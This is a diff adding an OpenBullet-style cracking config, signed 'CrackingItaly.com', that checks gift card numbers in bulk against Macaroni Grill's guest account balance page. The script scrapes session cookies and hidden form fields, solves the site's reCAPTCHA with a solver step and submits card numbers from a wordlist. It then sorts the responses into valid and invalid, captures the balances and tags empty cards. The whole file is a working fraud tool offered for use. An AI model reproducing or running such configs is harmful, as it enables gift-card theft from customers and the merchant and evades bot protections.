@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "MacaroniGrill",
+  "SuggestedBots": 9,
+  "LastModified": "2018-08-10T11:16:51.7066827+00:00",
+  "AdditionalInfo": "",
+  "Author": "demiurgo",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_GET REQUEST GET "https://macaronigrill.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+#PARSE_CFDUID PARSE "<COOKIES(__cfduid)>" LR "" "" Recursive=FALSE -> VAR "CFDUID" "" "" 
+#PARSE_JSESSIONID PARSE "<COOKIES(JSESSIONID)>" LR "" "" Recursive=FALSE -> VAR "JSESSIONIDZ" "" "" 
+#PARSE_CFLB PARSE "<COOKIES(__cflb)>" LR "" "" Recursive=FALSE -> VAR "CFLB" "" "" 
+#PARSE_USER PARSE "<SOURCE>" LR "action=\"/guest/nologin/account-balance\" role=\"form\" class=\"form-horizontal\"><input value=\"true\" type=\"hidden\" name=\"" "\"" Recursive=FALSE -> VAR "USERZ" "" "" 
+#PARSE_USER2 PARSE "<SOURCE>" LR "class=\"btn btn-default nologinCardnumberSubmitButton\" name=\"" "\">Submit" Recursive=FALSE -> VAR "USERZ2" "" "" 
+#PARSE_USER3 PARSE "<SOURCE>" LR "t_page = \"" "\";" Recursive=FALSE -> VAR "USERZ3" "" "" 
+#REQUEST_POST_FOR_COOKIE REQUEST POST "https://macaronigrill.myguestaccount.com/guest/ajax_request/<USERZ3/" AutoRedirect=TRUE 
+  CONTENT "__lift__GC=_" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://macaronigrill.myguestaccount.com" 
+  HEADER "Referer: https://macaronigrill.myguestaccount.com/guest/nologin/account-balance" 
+  HEADER "Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+RECAPTCHA "https://macaronigrill.myguestaccount.com/guest/nologin/account-balance" "6LdndBYUAAAAAIE_sQA2y29GSRaKJHKx2DodPT6m" -> VAR "REC" 
+#REQUEST_POST REQUEST POST "https://macaronigrill.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "<USERZ>=true&cardnum=<USER>&g-recaptcha-response=<REC>&<USERZ2>=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://macaronigrill.myguestaccount.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://macaronigrill.myguestaccount.com/guest/nologin/account-balance" 
+  HEADER "Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Cache-Control: max-age=0" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY ">Invalid card number.<" 
+    KEY ">card inactive<" 
+  KEYCHAIN Retry OR 
+    KEY "Invalid CAPTCHA. Please try again.</" 
+  KEYCHAIN Success OR 
+    KEY "\"panel-title\">Transaction History<" 
+#Capture_Account_Balance PARSE "<SOURCE>" LR "class=\"col-md-2\">$" "</div" Recursive=FALSE -> CAP "Account Balance" "$ " "  |  <CrackingItaly.com> demiurgo" 
+#Capture_Detail_Cards_Balance PARSE "<SOURCE>" LR "<div class=\"detailBalance\">" "</div" Recursive=TRUE -> CAP "Detail Cards Balance" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "class=\"col-md-2\">$0.00<" 
